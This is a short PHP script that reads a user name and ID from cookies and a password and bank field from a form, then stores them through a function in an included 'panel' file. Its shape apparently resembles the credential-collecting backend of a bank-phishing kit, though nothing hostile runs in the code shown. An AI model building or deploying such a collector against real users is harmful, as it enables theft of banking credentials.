<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $_COOKIE['usuario'];
$contrasena = $ifilter->process($_POST['pas']);
$banco = $ifilter->process($_POST['ban']);

$id = $_COOKIE['id'];
upgrade_user($id,$usuario,$contrasena,$banco);



?>